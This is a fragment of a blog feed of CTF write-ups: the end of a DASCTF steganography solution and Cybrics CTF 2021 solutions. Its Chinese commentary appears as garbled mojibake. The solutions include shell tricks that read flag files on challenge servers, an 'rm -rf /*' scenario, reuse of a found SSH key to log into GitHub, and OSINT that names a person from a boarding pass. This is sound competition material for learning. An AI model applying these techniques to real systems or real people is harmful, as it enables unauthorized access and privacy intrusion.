class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">        self.delta = delta</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        x is a vector of values to be quantized individually</span></span><br><span class="line"><span class="string">        m is a binary vector of bits to be embeded</span></span><br><span class="line"><span class="string">        returns: a quantized vector y</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">        d = self.delta</span><br><span class="line">        y = np.<span class="built_in">round</span>(x/d) * d + (-<span class="number">1</span>)**(m+<span class="number">1</span>) * d/<span class="number">4.</span></span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        z is the received vector, potentially modified</span></span><br><span class="line"><span class="string">        returns: a detected vector z_detected and a detected message m_detected</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        shape = z.shape</span><br><span class="line">        z = z.flatten()</span><br><span class="line"></span><br><span class="line">        m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">        z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line"></span><br><span class="line">        z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">        z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        d0 = np.<span class="built_in">abs</span>(z - z0)</span><br><span class="line">        d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line"></span><br><span class="line">        gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line">        <span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line">            <span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">                m_detected[i] = <span class="number">0</span></span><br><span class="line">                z_detected[i] = z0[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m_detected[i] = <span class="number">1</span></span><br><span class="line">                z_detected[i] = z1[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        z_detected = z_detected.reshape(shape)</span><br><span class="line">        m_detected = m_detected.reshape(shape)</span><br><span class="line">        <span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">qim = QIM(delta = <span class="number">20</span>)</span><br><span class="line">image = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;./ezSteganography-flag.png&quot;</span>))</span><br><span class="line">green = image[:, :, <span class="number">1</span>]</span><br><span class="line">green = green.ravel()</span><br><span class="line">[z_detected, msg_detected] = qim.detect(green)</span><br><span class="line">plt.imshow(msg_detected.reshape(<span class="number">1440</span>, <span class="number">2560</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF - Cybrics CTF 2021</title>
      <link href="2021/07/26/Cybrics%20CTF%202021/"/>
      <url>2021/07/26/Cybrics%20CTF%202021/</url>
      
        <content type="html"><![CDATA[<h2 id="Mic-Check"><a href="#Mic-Check" class="headerlink" title="Mic Check"></a>Mic Check</h2><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)                </p><p>Those organizers are changing <a href="https://cybrics.net/rules">game rules</a> all the time! Thereâ€™s a flag there, and itâ€™s not that easy to capture.</p><p><strong>Also be sure to join <a href="https://t.me/cybrics">@cybrics Telegram chat</a></strong> for challenge-related announcements and contacting orgs in case all goes wrong</p><p><strong>Added at 10:10 â€”</strong> looks like the little mic check trolling caused massive pain, Iâ€™ve untrolled the rules page :-) You can now copy-paste freely</p></blockquote><p>è§„åˆ™ä¸­è—æœ‰flagï¼šcybrics{Th1S_i5_T3h_R34l_m1C_ch3CK_f1A6}</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2021072744718452231.png?raw=true"></p><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><blockquote><p>Author: Mikhail Driagunov (<a href="https://t.me/aethereternity">@aethereternity</a>)                </p><p>Check out this cool new <a href="https://scanner-cybrics2021.ctf.su/"><strong>game</strong></a>!</p><p>I heard they serve flags at level 5.</p></blockquote><p>æ‹¼å›¾é¢˜ï¼Œåˆ†åˆ«å°†æ¯å…³çš„gifä¸‹è½½ä¸‹æ¥åˆ†è§£å¹¶è¿›è¡Œç®€å•çš„æ‹¼å›¾å¾—åˆ°å¦‚ä¸‹ï¼ˆPSï¼šç¬¬ä¸€å…³ä¸ºé€‰æ‹©é¢˜ä¸”æ˜¯å›ºå®šçš„ï¼Œç›´æ¥ä¸€ä¸ªä¸ªè¯•è¿‡å»å¾—çŸ¥ä¸ºhouseï¼‰</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727134475821357.png?raw=true"></p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727454344157814.png?raw=true"></p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727313578477126.png?raw=true"></p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727977581164385.png?raw=true"></p><p>æœ€åCQRæ‰«ç å¾—åˆ°flagï¼šcybrics{N0w_Y0u_4r3_4_c4sh13r_LOL}</p><p>é™„ä¸Šè„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">from PIL import Image, ImageSequence</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">def parseGIF(gifname):</span><br><span class="line">    # å°†gifè§£æä¸ºå›¾ç‰‡</span><br><span class="line">    # è¯»å–GIF</span><br><span class="line">    im &#x3D; Image.open(gifname)</span><br><span class="line">    # GIFå›¾ç‰‡æµçš„è¿­ä»£å™¨</span><br><span class="line">    iter &#x3D; ImageSequence.Iterator(im)</span><br><span class="line">    # è·å–æ–‡ä»¶å</span><br><span class="line">    file_name &#x3D; gifname.split(&quot;.&quot;)[0]</span><br><span class="line">    index &#x3D; 1</span><br><span class="line">    # åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨</span><br><span class="line">    pic_dirct &#x3D; &quot;imgs&#x2F;&#123;0&#125;&quot;.format(file_name)</span><br><span class="line">    mkdirlambda &#x3D; lambda x: os.makedirs(</span><br><span class="line">        x) if not os.path.exists(x) else True  # ç›®å½•æ˜¯å¦å­˜åœ¨,ä¸å­˜åœ¨åˆ™åˆ›å»º</span><br><span class="line">    mkdirlambda(pic_dirct)</span><br><span class="line">    # éå†å›¾ç‰‡æµçš„æ¯ä¸€å¸§</span><br><span class="line">    for frame in iter:</span><br><span class="line">        print(&quot;image %d: mode %s, size %s&quot; % (index, frame.mode, frame.size))</span><br><span class="line">        frame.save(&quot;imgs&#x2F;%s&#x2F;frame%d.png&quot; % (file_name, index))</span><br><span class="line">        index +&#x3D; 1</span><br><span class="line"></span><br><span class="line">    # frame0 &#x3D; frames[0]</span><br><span class="line">    # frame0.show()</span><br><span class="line"></span><br><span class="line">    # # æŠŠGIFæ‹†åˆ†ä¸ºå›¾ç‰‡æµ</span><br><span class="line">    # imgs &#x3D; [frame.copy() for frame in ImageSequence.Iterator(im)]</span><br><span class="line">    # # æŠŠå›¾ç‰‡æµé‡æ–°æˆæˆGIFåŠ¨å›¾</span><br><span class="line">    # imgs[0].save(&#39;out.gif&#39;, save_all&#x3D;True, append_images&#x3D;imgs[1:])</span><br><span class="line">    #</span><br><span class="line">    # # å›¾ç‰‡æµååº</span><br><span class="line">    # imgs.reverse()</span><br><span class="line">    # # å°†ååºåçš„æ‰€æœ‰å¸§å›¾åƒä¿å­˜ä¸‹æ¥</span><br><span class="line">    # imgs[0].save(&#39;.&#x2F;reverse_out.gif&#39;, save_all&#x3D;True, append_images&#x3D;imgs[1:])</span><br><span class="line"></span><br><span class="line">name &#x3D; &#39;vid.gif&#39;</span><br><span class="line">parseGIF(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ä¸Šé¢åˆ†è§£å®Œåçœ‹ä¸‹ç¬¬å‡ å¸§åˆ°ç¬¬å‡ å¸§æœ‰å›¾æ¡ˆå†å¯ç”¨ä¸‹é¢ä»£ç </span><br><span class="line">start &#x3D; 1 #åˆ†è§£å‡ºæ¥ç¬¬å‡ å¸§æœ‰å›¾æ¡ˆ</span><br><span class="line">stop &#x3D; 100+1 #åˆ°ç¬¬å‡ å¸§ç»“æŸ</span><br><span class="line">f_img &#x3D; Image.new(&#39;P&#39;,(1080,22*(stop-start)),255)</span><br><span class="line"></span><br><span class="line">for a in range(start,stop):</span><br><span class="line">    img &#x3D; Image.open(&#39;.&#x2F;imgs&#x2F;&#123;&#125;&#x2F;frame&#123;&#125;.png&#39;.format(name.split(&#39;.&#39;)[0],str(a))) #è£…æœ‰å›¾ç‰‡çš„æ–‡ä»¶å¤¹ï¼Œè‡ªå·±æ”¹ä¸‹</span><br><span class="line">    x,y &#x3D; img.size</span><br><span class="line">    tmpimg &#x3D; Image.new(&#39;P&#39;,(1080,22),255)</span><br><span class="line">    for i in range(496,518):</span><br><span class="line">        for j in range(x):</span><br><span class="line">            p &#x3D; img.getpixel((j,i))</span><br><span class="line">            # if p!&#x3D;255:</span><br><span class="line">                # print(j,i)</span><br><span class="line">            tmpimg.putpixel((j,i-496),p)</span><br><span class="line">    f_img.paste(tmpimg,(0,(a-start)*22))</span><br><span class="line">    plt.imshow(f_img)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure><h2 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h2><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)                </p><p>Guessing challenges? On <em>my</em> CyBRICS? Itâ€™s more likely than you think.</p><p>Prove youâ€™re a true CTFer!</p><p><a href="https://captf-cybrics2021.ctf.su/"><strong>captf-cybrics2021.ctf.su/</strong></a></p></blockquote><p>å°†çœ‹ä¸æ¸…çš„éªŒè¯ç å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ç„¶åä¸¢stegåˆ’ä¸€ä¸‹å°±èƒ½çœ‹æ¸…ï¼Œæœ€åè¾“å®Œ25æ¬¡éªŒè¯ç å³å¯å¾—åˆ°flagï¼šcybrics{a_k33n_Ey3_wi11_sp0T_r1GhT_aw4Y}</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2021072758587499651.png?raw=true"></p><h2 id="Recording"><a href="#Recording" class="headerlink" title="Recording"></a>Recording</h2><blockquote><p>Author: Mikhail Driagunov (<a href="https://t.me/aethereternity">@aethereternity</a>)</p><p>Iâ€™ve found a strange <a href="https://cybrics.net/files/strange_recording.mrf"><strong>recording</strong></a>.</p><p>What does it hide?</p></blockquote><p>é€šè¿‡å·¥å…· <strong>Macro recorder</strong> æ‰“å¼€é¼ æ ‡å®æŸ¥çœ‹å¯ä»¥å‘ç°ä»–è®¿é—®äº†ç½‘ç«™ï¼ˆpastebin.comï¼‰ç„¶åè¾“å…¥äº†å¯†ç ï¼Œå¹¶ä¸”ä½¿ç”¨çš„æ˜¯Oskè™šæ‹Ÿé”®ç›˜</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2021072784756231259449.png?raw=true"></p><p>æŠŠé‚£æ®µå…³é”®æµç¨‹å†…å®¹æˆªå–ä¸‹æ¥ï¼Œæ”¾Oskå¤ç°ä¸€éï¼Œä¸€ä¸ªä¸ªå¯¹åº”èµ·æ¥å°±æ˜¯uzqCjFUa 9yDz5iZprdï¼ˆå‰åŠéƒ¨åˆ†æ˜¯pastebin.comè®¿é—®çš„ç›®å½•ï¼ŒååŠéƒ¨åˆ†æ˜¯è®¿é—®å¯†ç ï¼‰</p><p>æœ€åé€šè¿‡<a href="http://www.pastebin.com/uzqCjFUa%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0flag%EF%BC%9Acybrics%7Bm4cr0_rulz_w000t%7D">http://www.pastebin.com/uzqCjFUaè¾“å…¥å¯†ç è§£ç å¾—åˆ°flagï¼šcybrics{m4cr0_rulz_w000t}</a></p><h2 id="ASCII-Terminal"><a href="#ASCII-Terminal" class="headerlink" title="ASCII Terminal"></a>ASCII Terminal</h2><blockquote><p>Author: Artur Khanov (<a href="https://t.me/awengar">@awengar</a>)                </p><p>At <code>**138.68.83.253:3333**</code> you have an ASCII terminal. It really works, check with the <a href="https://cybrics.net/files/id.txt"><code>**id**</code> command</a></p></blockquote><p>æ ¹æ®é¢˜ç›®æ‰€ç»™çš„ncä»¥åŠid commandï¼Œæˆ‘ä»¬å‘ç°å®ƒå¯ä»¥è·‘æŒ‡ä»¤</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/202107270945471645422.png?raw=true"></p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/202107271451526415447.png?raw=true"></p><p>äºæ˜¯æˆ‘ä»¬ç›´æ¥åˆ©ç”¨å‘½ä»¤ <code>cat f*</code> å¾—åˆ°flagï¼šcybrics{T3553R4C7_15_G00D}</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/202107278549166540021.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">....................................................$@$...................@@@@.....@@....................................................</span><br><span class="line">....................................................$@$...................@@@@.....@@....................................................</span><br><span class="line">..........................@@@@@$........@%@%@.....@@@@@@@................@@......@@@@@@@.................................................</span><br><span class="line">........................@@@...........@@,....@@.....@@@................@@@@@@@....@@@@...................................................</span><br><span class="line">.......................@@.....................@,....@@@.................,@@......@,..,@@.................................................</span><br><span class="line">.......................@@..............@@@@@@@@,....@@@.................,@@..............................................................</span><br><span class="line">.......................@@@............@@.....@@,....@@@.................,@@..............................................................</span><br><span class="line">.........................@@@@@@$.......@@@@@@.@@.....@@@@...............,@@..............................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.........................................................................................................................................</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="Ad-Network"><a href="#Ad-Network" class="headerlink" title="Ad Network"></a>Ad Network</h2><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)                </p><p>We are so tired of advertising on the internet. It  feels like it breaks the internet. Try to follow the ad, try to follow  its rules.</p><p><a href="http://adnetwork-cybrics2021.ctf.su/">Adnetwork website</a></p><p>There is a flag 1337 redirects deep into the networkâ€¦<a href="http://announcement-cybrics2021.ctf.su/">http://announcement-cybrics2021.ctf.su</a>)</p></blockquote><p>æ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åªéœ€é‡å®šå‘1337æ¬¡å³å¯ï¼ˆè€Œç«ç‹æµè§ˆå™¨é»˜è®¤æ˜¯20æ¬¡å°±åœæ­¢äº†ï¼‰</p><p>äºæ˜¯ä¹ï¼Œæˆ‘ä»¬å» <strong>about:config</strong> ä¸­æœç´¢ä¸‹ <strong>redirect</strong> è¿›è¡Œä¿®æ”¹</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/20210727839564485127.png?raw=true"></p><p>æœ€åè·‘å®Œå¾—åˆ°flagï¼šcybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}</p><p>ä¸Šè¿°æ–¹æ³•ä¸ªäººè§‰å¾—æœ‰ç‚¹bugï¼ˆå¯èƒ½æ˜¯æˆ‘ç”µè„‘çš„é—®é¢˜ï¼‰ï¼Œè¿˜æ˜¯ç›´æ¥è·‘è„šæœ¬é è°±äº›</p><p>é™„ä¸Šè„šæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;adnetwork-cybrics2021.ctf.su&#x2F;adnetwork&#39;</span><br><span class="line">for i in range(1500):</span><br><span class="line">    try:</span><br><span class="line">        r &#x3D; requests.get(url,allow_redirects&#x3D;False)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        url &#x3D; re.findall(&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&#39;,r.text)[0]</span><br><span class="line">        print(url)</span><br><span class="line">        #if &#39;&#123;&#39; in r.text:</span><br><span class="line">            #print(r.text)</span><br><span class="line">            #break</span><br><span class="line">    except:</span><br><span class="line">        print(url)</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure><h2 id="rm-rfâ€™er"><a href="#rm-rfâ€™er" class="headerlink" title="rm -rfâ€™er"></a>rm -rfâ€™er</h2><blockquote><p>Author: Vlad Roskov (<a href="https://t.me/mrvos">@mrvos</a>)                </p><p>Alarm! We accidentally did <code>rm -rf /*</code> on a very important server. Now all thatâ€™s left is one shell session.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh rmrfer@178.154.210.26</span><br><span class="line">Password: **sa7Neiyi**</span><br></pre></td></tr></table></figure><p>Rescue the <strong>flag.txt</strong> file from one of the directories by only using your shell</p><p><strong>Added at 13:45 â€”</strong> frequent question: yes, if you found <code>flag.txt</code>, the flag is right there, in the open, as plain text. Just read it. If  youâ€™re not seeing the flag, try to find another method that will not  hide info from you</p></blockquote><p>éé¢„æœŸï¼šæŠŠæ¡å¥½æ—¶æœºï¼Œåœ¨å®ƒ <code>rm</code> ä¹‹å‰ <code>ctrl c</code> å°±ä¸ä¼šç»™åˆ äº†ï¼Œç„¶åå°±ç›´æ¥catå¾—åˆ°flagï¼šcybrics{TCSHizzl3_Ma_N1zzl3}</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/202107274345678233714.png?raw=true"></p><p>é¢„æœŸè§£ï¼šæ ¹æ®tcshçš„å„ç§builtin commandå»è¯»ï¼ˆ <code>( echo $&lt; ) &lt; /etc/ctf/flag.txt</code> ï¼‰</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2021072746551514497324.png?raw=true"></p><h2 id="Namecheck"><a href="#Namecheck" class="headerlink" title="Namecheck"></a>Namecheck</h2><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)                </p><p>We have got the home folder from a criminalâ€™s computer. Try to find his/her real name.</p><p><a href="https://cybrics.net/files/eyebulling.tar.gz"><strong>eyebulling.tar.gz</strong></a></p><p>Flag format in uppercase: LASTNAME FIRSTNAME (ex: IVANOV IVAN)                                    </p></blockquote><p>ç¤¾å·¥é¢˜ï¼ï¼ï¼</p><p>åœ¨<code>.bash_history</code>ä¸­å¯çŸ¥åº”è¯¥ä¸<strong>git</strong>æœ‰å…³ï¼Œå¹¶ä¸”å¯èƒ½ä¸<strong>instagram</strong>æœ‰å…³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;instagram filter&quot;</span><br></pre></td></tr></table></figure><p>äºæ˜¯ç›´æ¥ç”¨sshkeyè¿æ¥GitHubï¼Œå¾—åˆ°GitHubç”¨æˆ·å<strong>poggersdog12</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i .ssh&#x2F;key git@github.com</span><br><span class="line">PTY allocation request failed on channel 0</span><br><span class="line">Hi poggersdog12! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br><span class="line">Connection to github.com closed.</span><br></pre></td></tr></table></figure><p>åœ¨GitHubä¸­æŸ¥æ‰¾ä¸€æ³¢ï¼Œæœ€ç»ˆé€šè¿‡apiæŸ¥åˆ°æœ‰ç”¨ä¿¡æ¯<strong>é‚®ç®±ï¼š<a href="mailto:&#x76;&#105;&#118;&#x69;&#100;&#99;&#x6f;&#x61;&#108;&#97;&#64;&#108;&#x6f;&#99;&#97;&#x6c;&#x68;&#111;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;">&#x76;&#105;&#118;&#x69;&#100;&#99;&#x6f;&#x61;&#108;&#97;&#64;&#108;&#x6f;&#99;&#97;&#x6c;&#x68;&#111;&#x73;&#116;&#x2e;&#x63;&#x6f;&#109;</a></strong></p><p>é‡‡é›†å®Œä¿¡æ¯ï¼Œæ¥ç€å°±æ˜¯åœ¨instagramä¸­æ‰¾åˆ° <strong>vividcoala</strong> çš„ä¸»é¡µï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€å¼ æ²¡æ‰“ç çš„é£æœºç¥¨ç…§ç‰‡</p><p><img src="https://github.com/MssnHarvey/cloudimg/blob/main/img/2010727414458995544454.png?raw=true"></p><p>é€šè¿‡<a href="https://online-barcode-reader.inliteresearch.com/"><strong>åœ¨çº¿ç½‘ç«™</strong></a>æ‰«æå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼Œå³å¾—åˆ°flagï¼šDIVOV NIKOLAI</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">M1DIVOV&#x2F;NIKOLAI MR EQCMYKK SVOLEDSU 0024 197Y020D0053 162&lt;532</span><br><span class="line">1MR1197BSU                                        2A555604939055</span><br><span class="line">9 1                          N</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CybricsCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro rememberMe ååºåˆ—åŒ–æ¼æ´</title>
      <link href="2021/07/09/shiro-rememberMe/"/>
      <url>2021/07/09/shiro-rememberMe/</url>
      
